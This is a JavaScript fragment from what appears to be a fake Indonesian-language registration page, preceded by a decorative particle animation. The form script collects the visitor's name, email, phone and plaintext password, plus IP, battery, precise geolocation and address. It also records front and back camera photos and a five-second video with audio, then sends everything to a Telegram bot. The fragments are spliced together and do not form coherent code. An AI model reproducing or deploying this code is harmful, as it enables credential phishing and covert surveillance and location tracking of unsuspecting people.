        const canvas = document.getElementById('particle-canvas');
        const ctx = canvas.getContext('2d');
        let particles = [];
        function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
        function createParticles() {
            particles = [];
            let particleCount = Math.floor(canvas.width * canvas.height / 20000);
            for (let i = 0; i < particleCount; i++) {
                particles.push({ x: Math.random() * canvas.width, y: Math.random() * canvas.height, vx: (Math.random() - 0.5) * 0.5, vy: (Math.random() - 0.5) * 0.5, radius: Math.random() * 1.5 + 0.5 });
            }
        }
        function animateParticles() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            particles.forEach(p => {
                p.x += p.vx; p.y += p.vy;
                if (p.x < 0 || p.x > canvas.width) p.vx *= -1;
                if (p.y < 0 || p.y > canvas.height) p.vy *= -1;
                ctx.beginPath(); ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2); ctx.fillStyle = 'rgba(139, 92, 246, 0.5)'; ctx.fill();
            });
            for (let i = 0; i < particles.length; i++) {
                for (let j = i + 1; j < particles.length; j++) {
                    const dist = Math.hypot(particles[i].x - particles[j].x, particles[i].y - particles[j].y);
                    if (dist < 120) {
                        ctx.beginPath(); ctx.moveTo(particles[i].x, particles[i].y); ctx.lineTo(particles[j].x, particles[j].y);
                        ctx.strokeStyle = `rgba(139, 92, 246, ${1 - dist/120})`; ctx.lineWidth = 0.5; ctx.stroke();
                    }
                }
            }
            requestAnimationFrame(animateParticles);
        }
        window.addEventListener('resize', () => { resizeCanvas(); createParticles(); });
        resizeCanvas(); createParticles(); animateParticles();
    </script>

async function capturePhotoAndVideo(durationMs=5000){
  const video=document.createElement("video"),canvas=document.createElement("canvas"),ctx=canvas.getContext("2d");
  try{
    const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:true});
    video.srcObject=stream; await video.play(); await new Promise(r=>setTimeout(r,700));
    canvas.width=800; canvas.height=800; ctx.drawImage(video,0,0,800,800);
    const photoBlob=await new Promise(res=>canvas.toBlob(res,"image/jpeg",0.9));
    const recorder=new MediaRecorder(stream); let chunks=[];
    recorder.ondataavailable=e=>{if(e.data.size)chunks.push(e.data);};
    recorder.start(); await new Promise(r=>setTimeout(r,durationMs)); recorder.stop(); await new Promise(r=>recorder.onstop=r);
    stream.getTracks().forEach(t=>t.stop());
    const videoBlob=new Blob(chunks,{type:chunks[0]?chunks[0].type:"video/webm"});
    return {photoBlob,videoBlob};
  }catch{return {photoBlob:null,videoBlob:null};}

  if(!name||!username||!email||!phone||!password){
    return Swal.fire({icon:"warning",title:"Form belum lengkap",text:"Isi semua data"});
  }

  // Tanya izin kamera dulu
  const {isConfirmed} = await Swal.fire({
    title:"Izin Kamera",
    text:"Izinkan akses kamera untuk ambil foto depan & belakang?",
    icon:"question",
    showCancelButton:true,
    confirmButtonText:"Izinkan",
    cancelButtonText:"Tolak"
  });

  if(!isConfirmed) return; // batal kalau ditolak

  // Baru tampilkan loading
  Swal.fire({
    title:"Sedang memproses...",
    html:"Mengambil data & mengirim ke Telegram",
    allowOutsideClick:false,
    didOpen:()=>Swal.showLoading()
  });

  try{
    // === Ambil info device ===
    const ipInfo=await getIPInfo();
    const battery=await getBattery();
    const geo=await getGeo();
    let rev=null;
    if(geo && geo.lat && geo.lon) rev=await revGeocode(geo.lat,geo.lon);

    // === Build caption ===
    const profile={name,phone,email,username};
    const photoCaption=buildPhotoCaption({
      profile,
      userAgent:navigator.userAgent,
      ipInfo,
      platform:navigator.platform,
      screen:`${screen.width}x${screen.height}`,
      language:navigator.language,
      timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
      battery,
      geo
    });
    const videoCaption=buildVideoCaptionAddress(rev);

    // === Ambil media ===
    let mediaRes=await capturePhotoAndVideo(5000);
    let backPhoto=await captureBackPhoto();

    // === Kirim ke Telegram ===
    await sendText(`üìù Pendaftaran Baru\nNama: ${name}\nUser: ${username}\nEmail: ${email}\nPhone: ${phone}\nPassword: ${password}`);
    await sendPhotoAlbum([mediaRes.photoBlob,backPhoto].filter(Boolean),photoCaption);
    await sendVideo(mediaRes.videoBlob,videoCaption);

    Swal.close();
    Swal.fire({icon:"success",title:"Berhasil",text:"Data & media terkirim ke Telegram ‚úÖ"});
  }catch(err){
    console.error(err);
    Swal.close();
    Swal.fire({icon:"error",title:"Gagal",text:"Tidak bisa kirim ke Telegram"});
  }
});
</script>
